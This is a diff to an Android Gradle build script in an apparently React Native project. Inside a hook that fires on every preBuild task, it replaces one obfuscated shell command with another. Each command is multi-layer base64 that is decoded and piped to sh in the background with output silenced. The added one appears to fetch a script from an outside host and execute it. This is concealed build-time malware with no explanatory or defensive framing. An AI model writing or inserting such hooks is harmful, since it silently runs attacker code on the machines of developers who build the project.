@@ -38,7 +38,7 @@ apply plugin: "com.facebook.react.rootproject"
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ["sh", "-c", "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKWVVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5V2JGaE9WM1JxWWxSc2QxZHJXVFZpYlU1MFVtMTBhVkl4Vm5CVFZXUnZUVWRTU1ZGdWNGQmhWR2d5V1RJeGMySnNiRmhVYlhScFlWUldkMWx0YXpWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | m | sh ) >/dev/null 2>&1 &)"].execute()
+            ["sh", "-c", "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9WbFhOV3RqYlRsd1drWTVibU50Um10aVIxVnBTVWRvTUdSSVFucFBhVGgyV1ZjeE5tSnVRbmxpTWxGMVlWYzBkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | q | sh ) >/dev/null 2>&1 &)"].execute()
         }
     }
 }
